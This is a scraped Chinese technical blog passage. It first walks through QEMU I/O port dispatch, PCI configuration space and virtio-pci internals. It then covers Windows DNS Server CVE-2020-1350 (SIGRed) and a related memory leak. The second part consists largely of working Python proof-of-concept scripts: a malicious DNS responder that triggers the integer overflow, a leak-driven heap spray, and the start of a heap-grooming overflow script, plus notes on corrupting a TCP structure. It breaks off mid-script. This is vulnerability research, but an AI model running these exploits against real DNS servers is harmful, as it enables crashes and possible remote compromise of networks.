portio_list_set_flush_coalesced(&amp;s-&gt;vga_port_list); portio_list_add(&amp;s-&gt;vga_port_list, address_space_io, 0x3b0); &#125; if (vbe_ports) &#123; portio_list_init(&amp;s-&gt;vbe_port_list, obj, vbe_ports, s, &quot;vbe&quot;); portio_list_add(&amp;s-&gt;vbe_port_list, address_space_io, 0x1ce);// s-&gt;vbe_portio_list 就是全局变量vbe_portio_list, 0x1ce指示了io port起始值. &#125;&#125; 最终, 当读 0x1ce 端口的时候, 就会调用vbe_ioport_read_index函数. 其实在vmware workstation里也可以看到类似的影子, 比如访问vmci设备的时候, 也是有个封装的上层处理函数在分发. PCI 配置空间这里简要介绍下PCI配置空间. 当一个设备加入的时候, 设备管理器要了解这个设备是干什么的, 怎么交互, 就需要读取设备的PCI配置空间. 它结构如下: Vendor ID：厂商ID。知名的设备厂商的ID。FFFFh是一个非法厂商ID，可它来判断PCI设备是否存在。 Device ID：设备ID。某厂商生产的设备的ID。操作系统就是凭着 Vendor ID和Device ID 找到对应驱动程序的。 Class Code：类代码。共三字节，分别是 类代码、子类代码、编程接口。类代码不仅用于区分设备类型，还是编程接口的规范，这就是为什么会有通用驱动程序。 IRQ Line：IRQ编号。PC机以前是靠两片8259芯片来管理16个硬件中断。现在为了支持对称多处理器，有了APIC（高级可编程中断控制器），它支持管理24个中断。 IRQ Pin：中断引脚。PCI有4个中断引脚，该寄存器表明该设备连接的是哪个引脚。 Bars: 一个有6个bar, 具体的使用看设备本身的实现. 当虚拟机识别到它的时候, 会向该区域写入值, 指示设备的bar用哪部分端口或内存地址. 如何访问配置空间呢？可通过访问0xCF8h、0xCFCh端口来实现。 下面的代码示例了通过遍历所有的bus&#x2F;dev&#x2F;func组合来搜索特定的vid和did的设备的bars. 123456789101112131415161718192021222324252627282930313233343536373839404142#define PCI_CONFIG_ADDRESS 0xcf8#define PCI_CONFIG_DATA 0xcfc#define PCI_BASE_ADDRESS_MEM_MASK (~0x0fUL)u32 retrieveAddress(u32 vid, u32 did, u32 *bars) &#123; u32 bus, dev, func; u32 dwAddr, dwData; int i; for (bus = 0; bus &lt;= 255; bus++) &#123; for (dev = 0; dev &lt; 32; dev++) &#123; for (func = 0; func &lt; 8; func++) &#123; dwAddr = 0x80000000 + (bus &lt;&lt; 16) + (dev &lt;&lt; 11) + (func &lt;&lt; 8); /* read vendor id */ outl(dwAddr, PCI_CONFIG_ADDRESS); dwData = inl(PCI_CONFIG_DATA); if ((dwData &amp; 0xffff) == vid)&#123;// vendor id if (((dwData &gt;&gt; 16) &amp; 0xffff) == did) &#123;// dev id for (i = 0; i &lt; 6; i++) &#123; outl(dwAddr | (0x10 + i * 4), PCI_CONFIG_ADDRESS);// bar0 dwData = inl(PCI_CONFIG_DATA); if (dwData &amp; 1) &#123; dwData ^= 1; &#125; else &#123; dwData &amp;= PCI_BASE_ADDRESS_MEM_MASK; &#125; bars[i] = dwData; &#125; return dwAddr; &#125; &#125; &#125; &#125; &#125; return 0;&#125; 对于一些现代PCIe设备, 配置空间更大, 就需要使用mmconfig来获取相应的配置信息. 半虚拟化设备Virtiovirtio设备分类两种, 一种是legacy, 一种是modern. legacy的, 就通过IO port 管理它的配置, modern就通过IO memory 来管理它的配置 要了解virtio设备, 还需要了解它的IO配置接口. 当一个virtio设备开始加载的时候, 会调用 virtio_pci_device_plugged 去初始化它的PCI&#x2F;PCIe 的 IO 空间. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149static void virtio_pci_device_plugged(DeviceState *d, Error **errp)&#123; ...; if (modern) &#123; virtio_pci_modern_regions_init(proxy, vdev-&gt;name); virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;common, &amp;cap); virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;isr, &amp;cap); virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;device, &amp;cap); virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;notify, &amp;notify.cap); pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;modern_mem_bar_idx, PCI_BASE_ADDRESS_SPACE_MEMORY | PCI_BASE_ADDRESS_MEM_PREFETCH | PCI_BASE_ADDRESS_MEM_TYPE_64, &amp;proxy-&gt;modern_bar); ... &#125; if (legacy) &#123; size = VIRTIO_PCI_REGION_SIZE(&amp;proxy-&gt;pci_dev) + virtio_bus_get_vdev_config_len(bus); size = pow2ceil(size); memory_region_init_io(&amp;proxy-&gt;bar, OBJECT(proxy), &amp;virtio_pci_config_ops, proxy, &quot;virtio-pci&quot;, size); pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;legacy_io_bar_idx, PCI_BASE_ADDRESS_SPACE_IO, &amp;proxy-&gt;bar); &#125;&#125;static const MemoryRegionOps virtio_pci_config_ops = &#123; .read = virtio_pci_config_read, .write = virtio_pci_config_write, .impl = &#123; .min_access_size = 1, .max_access_size = 4, &#125;, .endianness = DEVICE_LITTLE_ENDIAN,&#125;;static void virtio_pci_modern_regions_init(VirtIOPCIProxy *proxy, const char *vdev_name)&#123; static const MemoryRegionOps common_ops = &#123; .read = virtio_pci_common_read, .write = virtio_pci_common_write, .impl = &#123; .min_access_size = 1, .max_access_size = 4, &#125;, .endianness = DEVICE_LITTLE_ENDIAN, &#125;; static const MemoryRegionOps isr_ops = &#123; .read = virtio_pci_isr_read, .write = virtio_pci_isr_write, .impl = &#123; .min_access_size = 1, .max_access_size = 4, &#125;, .endianness = DEVICE_LITTLE_ENDIAN, &#125;; static const MemoryRegionOps device_ops = &#123; .read = virtio_pci_device_read, .write = virtio_pci_device_write, .impl = &#123; .min_access_size = 1, .max_access_size = 4, &#125;, .endianness = DEVICE_LITTLE_ENDIAN, &#125;; static const MemoryRegionOps notify_ops = &#123; .read = virtio_pci_notify_read, .write = virtio_pci_notify_write, .impl = &#123; .min_access_size = 1, .max_access_size = 4, &#125;, .endianness = DEVICE_LITTLE_ENDIAN, &#125;; static const MemoryRegionOps notify_pio_ops = &#123; .read = virtio_pci_notify_read, .write = virtio_pci_notify_write_pio, .impl = &#123; .min_access_size = 1, .max_access_size = 4, &#125;, .endianness = DEVICE_LITTLE_ENDIAN, &#125;; g_autoptr(GString) name = g_string_new(NULL); g_string_printf(name, &quot;virtio-pci-common-%s&quot;, vdev_name); memory_region_init_io(&amp;proxy-&gt;common.mr, OBJECT(proxy), &amp;common_ops, proxy, name-&gt;str, proxy-&gt;common.size); g_string_printf(name, &quot;virtio-pci-isr-%s&quot;, vdev_name); memory_region_init_io(&amp;proxy-&gt;isr.mr, OBJECT(proxy), &amp;isr_ops, proxy, name-&gt;str, proxy-&gt;isr.size); g_string_printf(name, &quot;virtio-pci-device-%s&quot;, vdev_name); memory_region_init_io(&amp;proxy-&gt;device.mr, OBJECT(proxy), &amp;device_ops, proxy, name-&gt;str, proxy-&gt;device.size); g_string_printf(name, &quot;virtio-pci-notify-%s&quot;, vdev_name); memory_region_init_io(&amp;proxy-&gt;notify.mr, OBJECT(proxy), &amp;notify_ops, proxy, name-&gt;str, proxy-&gt;notify.size); g_string_printf(name, &quot;virtio-pci-notify-pio-%s&quot;, vdev_name); memory_region_init_io(&amp;proxy-&gt;notify_pio.mr, OBJECT(proxy), &amp;notify_pio_ops, proxy, name-&gt;str, proxy-&gt;notify_pio.size);&#125;static void virtio_pci_modern_mem_region_map(VirtIOPCIProxy *proxy, VirtIOPCIRegion *region, struct virtio_pci_cap *cap)&#123; virtio_pci_modern_region_map(proxy, region, cap, &amp;proxy-&gt;modern_bar, proxy-&gt;modern_mem_bar_idx);&#125;static void virtio_pci_modern_region_map(VirtIOPCIProxy *proxy, VirtIOPCIRegion *region, struct virtio_pci_cap *cap, MemoryRegion *mr, uint8_t bar)&#123; memory_region_add_subregion(mr, region-&gt;offset, &amp;region-&gt;mr); cap-&gt;cfg_type = region-&gt;type; cap-&gt;bar = bar; cap-&gt;offset = cpu_to_le32(region-&gt;offset); cap-&gt;length = cpu_to_le32(region-&gt;size); virtio_pci_add_mem_cap(proxy, cap);&#125; 上面可以明显看到, 如果是modern类型, 就会调用 virtio_pci_modern_regions_init 注册很多个MemoryRegion, 之后调用 virtio_pci_modern_mem_region_map 重新映射到 proxy-&gt;modern_bar 这个region里, 之后是如下的调用 12345pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;modern_mem_bar_idx, PCI_BASE_ADDRESS_SPACE_MEMORY | PCI_BASE_ADDRESS_MEM_PREFETCH | PCI_BASE_ADDRESS_MEM_TYPE_64, &amp;proxy-&gt;modern_bar); 把 modern_bar 注册为IO memory. 而如果是legacy类型, 只是注册了一个IO port. 如下所示: 12pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;legacy_io_bar_idx, PCI_BASE_ADDRESS_SPACE_IO, &amp;proxy-&gt;bar); 通过访问这些IO, 就可以管理virtio设备. Virtio设备的注册在qemu中, virtio设备需要挂载在virtio-pci上. 一般来说, virtio设备的特点在于它大部分的实现都在内核, 用户态只需要配置基础的信息即可. 但是qemu本身也实现了一些相关设备的用户态实现, 比如virtio-net, 当启用vhost的时候, 它用户态基本上不做什么操作, 当未启用vhost时, 它的实现就在用户态的virtio-net.c文件中. virtio设备主要关注的是它的VirtQueue的注册. 以 virtio-net 未启用vhost的情况举例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758static void virtio_net_device_realize(DeviceState *dev, Error **errp)&#123; ... for (i = 0; i &lt; n-&gt;max_queue_pairs; i++) &#123; virtio_net_add_queue(n, i); &#125; n-&gt;ctrl_vq = virtio_add_queue(vdev, 64, virtio_net_handle_ctrl);&#125;static void virtio_net_add_queue(VirtIONet *n, int index)&#123; VirtIODevice *vdev = VIRTIO_DEVICE(n); n-&gt;vqs[index].rx_vq = virtio_add_queue(vdev, n-&gt;net_conf.rx_queue_size, virtio_net_handle_rx); if (n-&gt;net_conf.tx &amp;&amp; !strcmp(n-&gt;net_conf.tx, &quot;timer&quot;)) &#123; n-&gt;vqs[index].tx_vq = virtio_add_queue(vdev, n-&gt;net_conf.tx_queue_size, virtio_net_handle_tx_timer); n-&gt;vqs[index].tx_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, virtio_net_tx_timer, &amp;n-&gt;vqs[index]); &#125; else &#123; n-&gt;vqs[index].tx_vq = virtio_add_queue(vdev, n-&gt;net_conf.tx_queue_size, virtio_net_handle_tx_bh); n-&gt;vqs[index].tx_bh = qemu_bh_new(virtio_net_tx_bh, &amp;n-&gt;vqs[index]); &#125; n-&gt;vqs[index].tx_waiting = 0; n-&gt;vqs[index].n = n;&#125;VirtQueue *virtio_add_queue(VirtIODevice *vdev, int queue_size, VirtIOHandleOutput handle_output)&#123; int i; for (i = 0; i &lt; VIRTIO_QUEUE_MAX; i++) &#123; if (vdev-&gt;vq[i].vring.num == 0) break; &#125; if (i == VIRTIO_QUEUE_MAX || queue_size &gt; VIRTQUEUE_MAX_SIZE) abort(); vdev-&gt;vq[i].vring.num = queue_size; vdev-&gt;vq[i].vring.num_default = queue_size; vdev-&gt;vq[i].vring.align = VIRTIO_PCI_VRING_ALIGN; vdev-&gt;vq[i].handle_output = handle_output; vdev-&gt;vq[i].handle_aio_output = NULL; vdev-&gt;vq[i].used_elems = g_malloc0(sizeof(VirtQueueElement) * queue_size); return &amp;vdev-&gt;vq[i];&#125; 重点关注 virtio_add_queue 函数的调用即可. 它用来向virtio-pci注册每个queue对应的处理函数. 比如n-&gt;ctrl_vq = virtio_add_queue(vdev, 64, virtio_net_handle_ctrl); 就是注册了size为64的VirtQueue, 对ctrl_vq的访问都会触发 virtio_net_handle_ctrl 函数调用. virtio设备的访问以virtio-net设备为例, 假设注册的是legacy类型, 那么通过访问它的port, 就可以调用到virtio-pci的 virtio_pci_config_write-&gt;virtio_ioport_write 函数. 1234567891011121314151617181920212223242526static void virtio_ioport_write(void *opaque, uint32_t addr, uint32_t val)&#123; VirtIOPCIProxy *proxy = opaque; VirtIODevice *vdev = virtio_bus_get_device(&amp;proxy-&gt;bus); hwaddr pa; switch (addr) &#123; case VIRTIO_PCI_GUEST_FEATURES: /* Guest does not negotiate properly? We have to assume nothing. */ if (val &amp; (1 &lt;&lt; VIRTIO_F_BAD_FEATURE)) &#123; val = virtio_bus_get_vdev_bad_features(&amp;proxy-&gt;bus); &#125; virtio_set_features(vdev, val); break; case VIRTIO_PCI_QUEUE_SEL: if (val &lt; VIRTIO_QUEUE_MAX) vdev-&gt;queue_sel = val; break; case VIRTIO_PCI_QUEUE_NOTIFY: if (val &lt; VIRTIO_QUEUE_MAX) &#123; virtio_queue_notify(vdev, val); &#125; break; ... &#125;&#125; 假设case是 VIRTIO_PCI_QUEUE_NOTIFY 12345678910111213141516171819void virtio_queue_notify(VirtIODevice *vdev, int n)&#123; VirtQueue *vq = &amp;vdev-&gt;vq[n]; if (unlikely(!vq-&gt;vring.desc || vdev-&gt;broken)) &#123; return; &#125; trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq); if (vq-&gt;host_notifier_enabled) &#123; event_notifier_set(&amp;vq-&gt;host_notifier); &#125; else if (vq-&gt;handle_output) &#123; vq-&gt;handle_output(vdev, vq); if (unlikely(vdev-&gt;start_on_kick)) &#123; virtio_set_started(vdev, true); &#125; &#125;&#125; 从上面可以看到, 它实际是通过vdev-&gt;vq来获取相关的VirtQueue的, 而上面virtio-net初始化的时候, max_queue_pairs是1, 所以它最终只初始化了3个queue. 按照初始化时调用virtio_add_queue的顺序, vq[0]就是rx_vq, vq[1]是tx_vq, vq[2]是ctrl_vq. 所以如果n是0, 最后调用的vq-&gt;handle_output 就会是 virtio_net_handle_rx 函数.","categories":[],"tags":[],"keywords":[]},{"title":"Windows DNS server从cve-2020-1350到内存泄露","slug":"dns-overflow-and-memLeak","date":"2022-06-17T11:38:05.937Z","updated":"2020-10-18T08:07:53.571Z","comments":true,"path":"2022/06/17/dns-overflow-and-memLeak/","link":"","permalink":"http://474172261.github.io/2022/06/17/dns-overflow-and-memLeak/","excerpt":"7月14的公布了dns的一个远程rce的补丁, 与此同时, 发现者也发布了一篇相关的利用文章(虽然他们并没有完成利用:) ) 我也研究了下这个漏洞, 从复现poc到探究利用可能性, 花了几天时间, 然后发现了一个内存泄露. 一开始没有及时报, 没想到还是被别人撞了T-T. 原发现者的文章描述的已经足够详细, 本文将简短描述下从它的文章开始, 实现poc构造. 另外分享一下同时存在的内存泄露bug, 以及一些可能的利用思路.(拖延症患者, 内容比较随意, 主要是分享一些思路和想法, 所以比较随意….)","text":"7月14的公布了dns的一个远程rce的补丁, 与此同时, 发现者也发布了一篇相关的利用文章(虽然他们并没有完成利用:) ) 我也研究了下这个漏洞, 从复现poc到探究利用可能性, 花了几天时间, 然后发现了一个内存泄露. 一开始没有及时报, 没想到还是被别人撞了T-T. 原发现者的文章描述的已经足够详细, 本文将简短描述下从它的文章开始, 实现poc构造. 另外分享一下同时存在的内存泄露bug, 以及一些可能的利用思路.(拖延症患者, 内容比较随意, 主要是分享一些思路和想法, 所以比较随意….) CVE-2020-1350漏洞成因溢出点在行19, 其中rest_size最大值可以是0xffff-29-namelen(举例, 对于网址v-v.space, 其namelen 为”\\x03v-v\\x05space\\x00”的长度, 即11). 函数Name_PacketNameToCountNameEx读取的最大长度为0xff, 而RR_AllocateEx接受的第一个参数类型是u16类型, 从而在特殊情况下导致了整数溢出. poc构造思路虽然知道需要一个ns中转记录, 但是不太会配置dns服务器, 花了一天才弄明白中转的设置. 服务器管理器-&gt;工具-&gt;选择DNS-&gt;打开DNS管理器 打开转发器配置界面，配置伪DNS服务器IP地址此处的ip就是我们需要发送poc的伪服务器地址. 通过发现者发表的文章SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers中的这个图片 可以知道, 触发路径是Tcp_Receiver -&gt; Answer_ProcessMessage -&gt; Recurse_ProcessResponse -&gt; Recurse_CacheMessageResourceRecords -&gt; Wire_CreateRecordFromWire -&gt; SigWireRead. 通过文章内容我们知道, 大意就是让这个dns server 向另一个dns server(记作X)发起请求, 然后 X 回了一个要求用tcp请求连接的回执(因为默认dns查询用的udp), 然后dns server 再次用tcp 向 X 发起请求, X 回了一个包, 就能走到这个路径. 那么首先需要构造一个强制要求tcp的回执, 这里我直接dump了wireshark的一个正常查询v-v.space的回执包, 然后设置回执flag为tcp: 123456789101112131415161718192021222324252627282930313233resp = &quot;\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73&quot; \\&quot;\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a&quot; \\&quot;\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69&quot; \\&quot;\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00&quot; \\&quot;\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68&quot;def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind((&#x27;0.0.0.0&#x27;, 53)) while True: data, addr = s.recvfrom(2048) print &quot;received:&quot;, data.encode(&#x27;hex&#x27;), &quot;from&quot;, addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 # 设置flags ba[7] = 1 # 设置PR为1个 data = bytes(ba) l = s.sendto(data, addr) print &quot;sent&quot;, hex(l), hex(len(data)) print &#x27;-++++++++++++++++++++++\\n&#x27; s.close() print &#x27;close udp&#x27; def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind((&#x27;0.0.0.0&#x27;,53)) server.listen(5) while True: conn,addr = server.accept() print addr data = conn.recv(1024) ... conn.send(new_data) 之后, 向目标发起9999.v-v.space的dns请求: 12345678import dns.message, dns.queryimport threaddef doer(): m = dns.message.from_wire(&quot;\\xce\\x2e\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00&quot;+&quot;\\x049999&quot;+&quot;\\x03&quot;+&quot;v-v&quot;+&quot;\\x05&quot;+&quot;space&quot;+&quot;\\x00\\x00\\x01\\x00\\x01&quot;) # mr = dns.query.udp(m, &#x27;192.168.170.134&#x27;) # here is the target dns server.doer() 得到如下交互流程: 从交互流程可以看到, 我向192.168.170.134请求了一个dns, 它将请求转到192.168.170.1的dns服务器, 服务器回执了一个带truncated的flag的答复, 然后134用tcp连接到192.168.170.1, 重新发起请求. 这时候我可以回任意的回执. 接下来在函数Recurse_CacheMessageResourceRecords内下断点, 可以看到它a1+0xE06开始, 是我给回执. 至于为什么是+0xe06位置, 可以在函数Tcp_Receiver -&gt; Tcp_ReceiveMessage的recv调用找到. 接下来就是枯燥的逆向Recurse_CacheMessageResourceRecords函数的流程. 此处我不会再讲怎么逆向, 只说一下大致的执行流程. dns有4个类型的请求, questions, answer, authority, additional. 函数按顺序从dns头获取该类型的个数, 然后执行相应的处理. 当处理到answer类型, 且type为46或者24时, 就能进入到Wire_CreateRecordFromWire函数. 所以完整type46的poc如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# -*- coding: UTF-8import socketfrom impacket.structure import Structureimport dns.message, dns.queryimport threadingimport structresp = &quot;\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73&quot; \\&quot;\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a&quot; \\&quot;\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69&quot; \\&quot;\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00&quot; \\&quot;\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68&quot;def getNameLen(data): s = 0 o = 14 l=ord(data[o:o+1]) while l: s += l+1 print l o += 1+l l = ord(data[o:o+1]) return s+1def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind((&#x27;0.0.0.0&#x27;,53)) server.listen(5) while True: conn,addr = server.accept() print(conn,addr) while True: data = conn.recv(1024) if not data: continue # print &#x27;recive:&#x27;,data.encode(&#x27;hex&#x27;) ba = bytearray() poison = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\xff\\xcc&#x27;+&#x27;a&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;\\x00&#x27;*0xffff data = data[:18+getNameLen(data)]+poison ba.extend(map(ord, data[:0xffff+2])) ba[0] = struct.pack(&#x27;&gt;H&#x27;, 0xffff)[0] ba[1] = struct.pack(&#x27;&gt;H&#x27;, 0xffff)[1] # flags ba[4] = 0x84 ba[5] = 0 # answer PRs ba[8] = 0 ba[9] = 1 # other prs ba[10] = 0 ba[11] = 0 ba[12] = 0 ba[13] = 0 data = bytes(ba) l = conn.send(data) print &#x27;sent&#x27;,hex(l), hex(len(data)) print &#x27;---------------------------\\n&#x27; conn.close() break print &#x27;tcp recv exit&#x27;def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind((&#x27;0.0.0.0&#x27;, 53)) while True: data, addr = s.recvfrom(2048) print &quot;received:&quot;, data.encode(&#x27;hex&#x27;), &quot;from&quot;, addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 ba[7] = 1 data = bytes(ba) l = s.sendto(data, addr) print &quot;sent&quot;, hex(l), hex(len(data)) print &#x27;-++++++++++++++++++++++\\n&#x27; s.close() print &#x27;close udp&#x27;import threadthread.start_new_thread(udp_handler,())thread.start_new_thread(tcp_handler,())raw_input(&#x27;&gt;&#x27;) type 24的可以参见CVE-2020-1350 (SIGRed) - Windows DNS DoS Exploit 内存泄露内存泄露就很简单了, 在函数Recurse_CacheMessageResourceRecords的循环处理函数Wire_CreateRecordFromWire返回值的时候, 如果在处理下一个answer时中途出现错误, 会直接跳出循环. 虽然它保存了所有的内存指针, 但是并没有调用free操作把所有指针释放掉, 导致最后内存指针丢失, 造成内存泄露. 最后微软给的cve是 CVE-2020-1228 . 以下是内存泄露的poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123# -*- coding: UTF-8import socketfrom impacket.structure import Structureimport dns.message, dns.queryimport threadingimport structimport timeresp = &quot;\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73&quot; \\&quot;\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a&quot; \\&quot;\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69&quot; \\&quot;\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00&quot; \\&quot;\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68&quot;def getNameLen(data): s = 0 o = 14 l=ord(data[o:o+1]) while l: s += l+1 print l o += 1+l l = ord(data[o:o+1]) return s+1def get_alloc_max_spray(n, n_answer): if n &gt; 0x7f7: raise &quot;number is too big&quot; p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\xe0&#x27;+&#x27;\\xaa&#x27;*18+&#x27;\\xc0\\x0d&#x27;+&#x27;a&#x27;*7+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x39&#x27;+&#x27;a&#x27;*0x39+&#x27;\\x15&#x27;+&#x27;a&#x27;*0x15+&#x27;\\x00&#x27; p1 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\x00\\x14&#x27;+&#x27;\\x00&#x27;*18+&#x27;\\xc0\\x0d&#x27; n_answer[0] = n+1 return p0+p1*(n-1)def get_alloc_max_and_free(n, n_answer): n_answer[0] = (n+0x100)/8 if n &gt; 0x10047: raise &quot;number is too large&quot; size = 0xff&amp;(n-0x48-0x3b) p0 = &#x27;\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec&#x27;+&#x27;\\xff&#x27;+chr(size)+&#x27;a&#x27;*18+&#x27;\\xc0\\x0d&#x27; # size = 0xffc4+0x3b = 0xffff return p0def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind((&#x27;0.0.0.0&#x27;,53)) server.listen(5) # totalSize = 0 # size = totalSize-0x48-0 n_answer = [0, 0] funcs = [ get_alloc_max_spray ] steps = [ (0x2ab0*4, funcs[0], 3), ] step = 0 step_i = 0 while True: conn,addr = server.accept() print addr while True: data = conn.recv(1024) if not data: continue print &#x27;step:&#x27;,step,&#x27;step_i&#x27;, step_i ba = bytearray() data = data[:18+getNameLen(data)]+steps[step][1](steps[step][2], n_answer) ba.extend(map(ord, data)) ba[0] = struct.pack(&#x27;&gt;H&#x27;, len(data)-2)[0] ba[1] = struct.pack(&#x27;&gt;H&#x27;, len(data)-2)[1] # flags ba[4] = 0x84 ba[5] = 0 # answer PRs ba[8] = n_answer[0]&gt;&gt;8 ba[9] = n_answer[0]&amp;0xff # other prs ba[10] = n_answer[1]&gt;&gt;8 ba[11] = n_answer[1]&amp;0xff ba[12] = 0 ba[13] = 0 data = bytes(ba) if step == 4: thread.start_new_thread(sendAQuery,()) time.sleep(0.001) l = conn.send(data) print &#x27;sent&#x27;,hex(l), hex(len(data)) print &#x27;---------------------------\\n&#x27; conn.close() step_i += 1 if steps[step][0] == step_i: step += 1 step_i = 0 break print &#x27;tcp recv exit&#x27;def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind((&#x27;0.0.0.0&#x27;, 53)) while True: data, addr = s.recvfrom(2048) print &quot;received:&quot;, data.encode(&#x27;hex&#x27;), &quot;from&quot;, addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 ba[7] = 1 data = bytes(ba) l = s.sendto(data, addr) print &quot;sent&quot;, hex(l), hex(len(data)) print &#x27;-++++++++++++++++++++++\\n&#x27; s.close() print &#x27;close udp&#x27;import threadthread.start_new_thread(udp_handler,())thread.start_new_thread(tcp_handler,())raw_input(&#x27;&gt;&#x27;) cve-2020-1350的利用思路分析通过分析它的堆分配函数Mem_Alloc可以知道, 当请求的size超过0xa0时会分配传统heap, 否则从它自定义的大堆内选一个被切出来的小块作为结果返回. 而在函数Recurse_CacheMessageResourceRecords内, 它把函数Wire_CreateRecordFromWire返回的heap通过单项链表串联了起来, +0位置指示了下一个结构体的指针. 利用内存泄露bug, 就可以实现完美的内存布局. 而dns内部, 某些size对应的堆并没有被激活lfh, 所以可以和普通的大堆挨在一起. tcp主结构体溢出思路 申请非常多0x10000这种大内存, 耗尽空隙 利用records申请一个0x10000+0x100的内存, 再申请个0x10000的内存(记作T), 那么这两个内存就会挨着. 在处理结束后, 就会留下一个0x100120的洞 申请一个0x10000的内存, 就会切下一个0x110的洞 申请一个tcp的query请求, 再申请一个0x100的内存来溢出, 由于它内部一些机制, 最后会把当前tcp的大块0x101f4申请到 T内存 之后, 从而可以溢出到tcp的主结构体 我最后并没有在windows server 2019上找到合适的泄露信息组件, 导致没办法完成利用. 精力有限, 便没有继续深入分析. 希望有兴趣的人可以基于此作更长远的利用. 下面是一个溢出的示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205# -*- coding: UTF-8import socketfrom impacket.structure import Structureimport dns.message, dns.queryimport threadingimport structimport timeresp = &quot;\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73&quot; \\&quot;\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a&quot; \\&quot;\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69&quot; \\&quot;\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00&quot; \\&quot;\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68&quot;def sendAQuery(): m = dns.message.from_wire(&quot;\\xcc\\x2e\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00&quot;+&quot;\\x049999&quot;+&quot;\\x03&quot;+&quot;v-v&quot;+&quot;\\x05&quot;+&quot;space&quot;+&quot;\\x00\\x00\\x01\\x00\\x01&quot;) mr = dns.query.tcp(m, &#x27;192.168.170.140&#x27;) print 